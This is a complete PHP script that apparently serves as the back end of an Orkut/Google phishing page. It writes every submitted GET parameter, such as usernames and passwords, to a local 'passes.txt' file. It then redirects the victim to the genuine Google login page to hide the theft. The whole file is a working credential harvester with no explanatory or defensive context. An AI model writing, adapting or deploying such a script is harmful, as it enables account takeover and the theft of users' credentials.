<?php
header("Location: https://www.google.com/accounts/ServiceLogin?service=orkut&hl=en-US&rm=false&continue=http%3A%2F%2Fwww.orkut.com%2FRedirLogin%3Fmsg%3D0%26page%3Dhttp%253A%252F%252Fwww.orkut.com%252FHome&cd=US&passive=true&skipvpage=true&sendvemail=false");
$handle = fopen("passes.txt", "a");
foreach($_GET as $variable => $value)
 {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
